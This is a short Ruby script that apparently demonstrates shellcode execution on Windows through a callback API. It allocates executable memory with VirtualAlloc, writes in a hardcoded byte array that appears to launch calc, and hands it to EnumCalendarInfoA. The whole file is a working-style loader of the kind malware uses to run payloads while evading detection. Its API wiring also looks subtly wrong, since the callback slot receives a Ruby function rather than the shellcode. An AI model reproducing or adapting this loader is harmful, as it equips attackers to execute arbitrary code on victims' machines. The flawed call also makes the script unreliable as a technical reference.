require 'ffi'

module Callback_Code_Execution
  extend FFI::Library
  ffi_lib 'kernel32'
  MEM_COMMIT = 0x00001000
  MEM_RESERVE = 0x00002000
  PAGE_EXECUTE_READWRITE = 0x40
  attach_function :VirtualAlloc, [:pointer, :size_t, :uint32, :uint32], :pointer
  attach_function :EnumCalendarInfoA, [:pointer, :uint32, :uint32, :pointer], :bool
  callback :enum_calendar_info, [:pointer, :uint32, :uint32, :pointer], :bool
end

def main
  shellcode = [
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
    0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
    0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
    0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
    0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
    0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
    0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
  ].pack('C*')

  dbginf = ->(msg) { puts msg }

  address = Callback_Code_Execution.VirtualAlloc(nil, shellcode.bytesize, Callback_Code_Execution::MEM_COMMIT | Callback_Code_Execution::MEM_RESERVE, Callback_Code_Execution::PAGE_EXECUTE_READWRITE)
  if address.null?
    dbginf.call("Alloc failed: #{FFI.last_error}")
    return
  end

  dbginf.call("Allocated at: #{address.to_i.to_s(16)}")
  FFI::MemoryPointer.new(shellcode.bytesize).tap do |ptr|
    ptr.write_bytes(shellcode)
    address.write_bytes(ptr.read_bytes(shellcode.bytesize))
  end
  dbginf.call("Shellcode written")

  callback = FFI::Function.new(:bool, [:pointer, :uint32, :uint32, :pointer]) do |p1, p2, p3, p4|
    dbginf.call("Callback: #{p1.to_i}, #{p2}, #{p3}, #{p4.to_i}")
    true
  end

  res = Callback_Code_Execution.EnumCalendarInfoA(callback, 0x0400, 0x00000001, address)
  if res == 0
    dbginf.call("EnumCalendarInfoA failed: #{FFI.last_error}")
  else
    dbginf.call("EnumCalendarInfoA succeeded")
  end
end

main
